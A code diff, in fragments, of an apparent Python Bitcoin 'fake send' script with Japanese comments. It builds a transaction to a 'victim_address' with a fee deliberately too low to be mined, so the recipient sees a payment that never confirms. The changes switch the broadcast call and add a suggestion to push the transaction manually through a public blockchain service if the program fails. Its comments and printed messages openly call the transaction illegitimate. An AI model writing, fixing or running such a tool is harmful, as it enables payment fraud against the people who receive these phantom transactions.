@@ -1,5 +1,5 @@
-import argparse
 import time
+import argparse
 import requests
 import subprocess
 import cryptos
@@ -82,7 +82,7 @@ if balance < send_amount:
 
 fee = 1 # ここはマインングできないくらい著しく小さな値にすることが重要。
 
-change_btc_amt = (balance - send_amount)#おつり
+change_btc_amt = (balance - send_amount) #おつり
 
 if testnet:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
@@ -124,8 +124,11 @@ print()
 print()
 print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
 print()
-print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
-transaction_util.pushtx(tx_victim)
+time.sleep(3) #詠唱中...  -u- 
+
+print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
+
+broadcast_transaction(tx_victim, testnet)
 #broadcast_transaction(tx_victim, testnet)
 print()
 #ゴリ押し
@@ -151,4 +154,6 @@ inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
 print("----------------")
 balance = transaction_util.get_balance(victim_address)
 print(f"fake send to address Balance (satoshi unit) :{balance}")
+print()
+print("Tips : If you are unable to send from the program side, why not try sending manually using the service at the following URL?: https://live.blockcypher.com/")
 print("Done.")
